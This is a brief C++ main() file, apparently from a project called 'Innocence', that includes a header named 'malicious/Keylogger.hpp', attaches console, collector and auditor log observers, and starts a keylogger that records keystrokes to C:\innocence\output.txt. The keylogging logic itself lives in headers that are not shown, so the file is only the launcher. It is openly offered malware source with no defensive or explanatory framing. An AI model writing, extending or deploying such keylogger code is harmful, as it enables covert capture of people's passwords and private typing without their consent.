#include <log/Log.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
#include <common/Innocence.hpp>
#include <audit/Audit.hpp>

int main()
{
    TRACE_FUNCTION
	LOG.setIdentity(Common::identity);
    LOG.addObserver(new Log::LogToConsole);
    LOG.addObserver(new Log::LogToCollector);
	LOG.addObserver(new Audit::LogToAuditor);

    Malicious::Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
    Malicious::Keylogger::instance().start();
	system("pause");
	return EXIT_SUCCESS;
}
